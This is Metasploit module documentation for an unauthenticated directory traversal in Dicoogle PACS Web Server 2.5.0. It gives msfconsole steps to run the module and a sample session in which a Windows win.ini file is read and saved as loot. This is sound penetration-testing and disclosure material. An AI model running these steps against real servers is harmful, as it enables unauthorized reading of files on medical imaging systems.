## Description

This module exploits an unauthenticated directory traversal vulnerability
in the Dicoogle PACS Web Server v2.5.0 and possibly earlier, allowing an
attacker to read arbitrary files with the web server privileges.
While the application is java based, the directory traversal was only
successfully tested against Windows targets.


## Verification Steps

  1. Start `msfconsole`
  2. `use auxiliary/scanner/http/dicoogle_traversal`
  3. `set RHOSTS [IP]`
  4. `run`

## Scenarios

### Tested on Windows 2012 with Dicoogle 2.5.0 on Java 8 update 151

  ```
  msf5 > use auxiliary/scanner/http/dicoogle_traversal 
  msf5 auxiliary(scanner/http/dicoogle_traversal) > set rhosts 1.1.1.1
  rhosts => 1.1.1.1
  msf5 auxiliary(scanner/http/dicoogle_traversal) > set verbose true
  verbose => true
  msf5 auxiliary(scanner/http/dicoogle_traversal) > run
  
  [+] 192.168.2.164:8080 - ; for 16-bit app support
  [fonts]
  [extensions]
  [mci extensions]
  [files]
  [Mail]
  MAPI=1
  
  [+] File saved in: /root/.msf4/loot/20180803091123_default_192.168.2.164_dicoogle.travers_347491.txt
  ```
